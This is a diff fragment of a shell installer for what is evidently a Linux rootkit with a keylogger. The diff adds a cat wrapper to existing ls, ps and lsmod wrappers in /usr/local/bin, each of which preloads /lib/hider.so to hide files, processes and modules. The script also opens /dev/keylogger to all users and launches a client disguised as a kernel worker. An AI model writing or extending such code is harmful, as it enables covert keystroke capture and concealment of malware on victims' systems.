@@ -77,7 +77,7 @@ if [ -n "$MAJOR" ]; then
     chmod 666 /dev/keylogger
 fi
 
-# 4. Setup Wrapper Binaries in /usr/local/bin (Global PATH override for ls, ps, and lsmod)
+# 4. Setup Wrapper Binaries in /usr/local/bin (Global PATH override for ls, ps, lsmod, and cat)
 cat <<'EOF' > /usr/local/bin/ls
 #!/bin/bash
 LD_PRELOAD=/lib/hider.so /bin/ls "$@"
@@ -93,9 +93,15 @@ cat <<'EOF' > /usr/local/bin/lsmod
 LD_PRELOAD=/lib/hider.so /sbin/lsmod "$@"
 EOF
 
+cat <<'EOF' > /usr/local/bin/cat
+#!/bin/bash
+LD_PRELOAD=/lib/hider.so /bin/cat "$@"
+EOF
+
 chmod +x /usr/local/bin/ls
 chmod +x /usr/local/bin/ps
 chmod +x /usr/local/bin/lsmod
+chmod +x /usr/local/bin/cat
 
 # 5. Run client immediately under stealth hook
 killall -9 kworker_d > /dev/null 2>&1
